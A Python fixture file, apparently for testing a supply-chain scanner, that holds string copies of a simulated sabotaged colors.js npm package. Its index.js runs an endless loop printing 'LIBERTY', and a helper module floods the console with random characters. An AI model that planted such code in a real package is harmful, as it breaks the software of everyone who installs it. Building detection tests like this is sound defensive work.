"""
Simulated colors.js (protestware) attack patterns.
Real attack: maintainer Marak intentionally sabotaged, added infinite loop + LIBERTY.
"""

PACKAGE_JSON = """{
  "name": "colors",
  "version": "1.4.44-liberty-2",
  "description": "get colors in your node.js console"
}"""

INDEX_JS = """
'use strict';

var colors = {};
module['exports'] = colors;

// Injected protestware: infinite loop with garbage output
var am = require('./lib/custom/american');
am();

for (let i = 666; i > 0; i++) {
  if (i % 100 === 0) {
    console.log('LIBERTY LIBERTY LIBERTY');
  }
  // Infinite loop — i++ when i > 0 never terminates
}
"""

AMERICAN_JS = """
module.exports = function() {
  // Zalgo text generator — outputs garbage to console
  var z = [];
  for (var i = 0; i < 1000; i++) {
    var s = "            ";
    for (var j = 0; j < 20; j++) {
      s += String.fromCharCode(Math.floor(Math.random() * 65535));
    }
    z.push(s);
  }
  console.log(z.join('\\n'));
};
"""

PACKAGE_FILES = {
    "colors-1.4.44/package.json": PACKAGE_JSON,
    "colors-1.4.44/index.js": INDEX_JS,
    "colors-1.4.44/lib/custom/american.js": AMERICAN_JS,
}
